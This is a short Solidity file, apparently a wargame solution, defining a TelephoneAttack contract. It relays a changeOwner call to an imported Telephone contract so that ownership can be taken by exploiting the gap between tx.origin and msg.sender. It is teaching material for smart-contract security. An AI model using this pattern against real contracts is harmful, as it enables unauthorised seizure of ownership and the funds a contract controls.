// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Import the Telephone contract
import "./Telephone.sol";

contract TelephoneAttack {
    Telephone public telephoneContract;

    constructor(Telephone _telephoneContract) {
        telephoneContract = _telephoneContract;
    }

    function forwardTransaction(address newOwner) public {
        telephoneContract.changeOwner(newOwner);
    }
}
